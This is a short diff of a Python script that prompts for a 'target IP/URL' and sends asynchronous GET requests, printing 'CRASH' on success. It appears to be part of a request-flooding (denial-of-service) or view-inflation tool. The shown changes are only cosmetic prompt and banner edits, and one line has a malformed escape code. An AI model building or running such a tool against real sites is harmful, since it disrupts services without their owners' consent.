@@ -45,15 +45,14 @@ print("\033[33m             \033[0m")
 print("\033[33m             \033[0m")
 print("\033[33m             \033[0m")
 print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵          \033[0m")
-
-Target = fade.pinkred("\033[93mEnter the target IP/URL:\033[0m")
-url = input("\033[93mask \033[0m")
-
+print("\033[96-------------------------------------------------------------------\033[0m")
+ask = fade.pinkred("Enter the target IP/URL:")
+url= input(ask)
 async def increment_view_count(session):
     try:
         async with session.get(url) as response:
             if response.status == 200:
-                print("\033[31mCRASH\033[0m")
+                print("[+]\033[31mCRASH\033[0m")
             else:
                 print("Failed ping.")
     except aiohttp.ClientError as e:
